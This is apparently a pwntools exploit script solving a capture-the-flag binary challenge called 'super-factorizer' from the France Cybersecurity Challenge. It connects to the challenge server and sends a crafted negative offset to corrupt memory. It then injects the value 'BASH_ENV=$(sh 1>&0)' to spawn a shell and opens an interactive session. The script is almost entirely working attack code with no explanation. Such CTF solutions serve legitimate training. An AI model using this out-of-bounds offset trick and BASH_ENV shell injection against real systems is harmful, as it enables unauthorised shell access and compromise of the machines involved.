from pwn import *

if args.LOCAL:
    io = process('./super-factorizer')
    if args.GDB:
        cmd="""
        """
        gdb.attach(io, cmd)
else:
    io = remote("challenges.france-cybersecurity-challenge.fr",  2105)

def offset(off):
    return (u64(p64(-(off), signed=True)) - 16) // 8

print(offset(416))
io.sendline(str(offset(416)).encode())

io.sendline(b'BASH_ENV=$(sh 1>&0)')
io.sendline(b'\n')    
io.interactive()
